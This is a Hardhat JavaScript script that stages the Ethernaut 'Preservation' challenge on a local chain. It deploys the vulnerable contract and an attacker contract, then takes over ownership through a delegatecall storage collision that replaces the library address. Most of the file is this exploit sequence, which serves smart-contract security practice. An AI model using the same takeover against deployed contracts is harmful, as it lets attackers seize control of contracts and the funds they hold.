/*
To recreate the Preservation challenge in a local blockchain is required to:
  - Deploy two times the LibraryContract and pass their addresses to the Preservation contract to initialize the two timeZoneLibrary variables.
  - 
*/

/*
* Logic to hack the level:
* 1.- 
*/

const hre = require("hardhat");

async function main() {
  // Recreating the attack on ganache
  [player, deployer] = await ethers.getSigners();

  // Deploy LibraryContract1
  const LibraryContract1 = await hre.ethers.getContractFactory("LibraryContract");
  this.libraryContract1 = await LibraryContract1.connect(deployer).deploy();
  await this.libraryContract1.deployed();

  // Deploy LibraryContract2
  const LibraryContract2 = await hre.ethers.getContractFactory("LibraryContract");
  this.libraryContract2 = await LibraryContract2.connect(deployer).deploy();
  await this.libraryContract2.deployed();

  // Deploy the Preservation contract
  const Preservation = await hre.ethers.getContractFactory("Preservation");
  this.preservation = await Preservation.connect(deployer).deploy(this.libraryContract1.address, this.libraryContract2.address);
  await this.preservation.deployed();


  // Deploying the AttackerReentrance contract
  const PreservationAttack = await hre.ethers.getContractFactory("PreservationAttack");
  this.preservationAttack = await PreservationAttack.connect(player).deploy(this.preservation.address);
  await this.preservationAttack.deployed();

  console.log(
    `
    Preservation contract address ${await this.preservation.address} \n
    PreservationAttack contract address ${await this.preservationAttack.address} \n
    timeZone1Library ${await this.preservation.timeZone1Library()} \n
    timeZone2Library ${await this.preservation.timeZone2Library()} \n
    owner ${await this.preservation.owner()}
    `
  );

  console.log("\n\n Performing attack ... \n\n");

  // Updating the address of the timeZone1Library variable
  console.log("Updating the address of the timeZone1Library variable ...");

  const changeLibraryAddressTX = await this.preservationAttack.connect(player).changeLibraryAddress();
  
  // Await for the changeLibraryAddressTX to be mined
  console.log("Waiting while the address of the timeZone1Library variable is updated : )");
  let changeLibraryAddressTXResult = await changeLibraryAddressTX.wait();

  //console.log("transaction " , changeLibraryAddressTXResult);

  console.log("===============================================\n===============================================\n");
  console.log("\n Results after updating the timeZone1Library address for the Attacker contract address \n");

  console.log(
    `
    PreservationAttack contract address ${await this.preservationAttack.address} \n
    timeZone1Library ${await this.preservation.timeZone1Library()}
    `
  );

  // Completing the Attack
  // Now that timeZone1Library is pointing to the attacker contract, is a matter to call the malitious setTime() of the Attacker contract to update the owner of the Preservation contract!
  console.log("\n Completing the attack --- Taking ownership of the Preservation contract \n\n");

  // setFirstTime() of the Preservation contract will use the address stored in the timeZone1Library variable (Which is the address of the malitious contract)
  // At the end, the function that will be executed is the setFirstTime() of the malicious contract!
  const takeOwnershipTX = await this.preservation.connect(player).setFirstTime(1);
  
  // Await for the takeOwnershipTX to be mined
  console.log("Waiting while we take ownership of the Preservation contract : )");
  let takeOwnershipTXResult = await takeOwnershipTX.wait();

  console.log(
    `
    Preservation contract address ${await this.preservation.address} \n
    PreservationAttack contract address ${await this.preservationAttack.address} \n
    timeZone1Library ${await this.preservation.timeZone1Library()} \n
    timeZone2Library ${await this.preservation.timeZone2Library()} \n
    player address: ${await player.address} \n
    Preservation contract's owner ${await this.preservation.owner()}
    `
  );
  
  console.log("\n\n ========================== Attack Completed!!!! ==========================");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});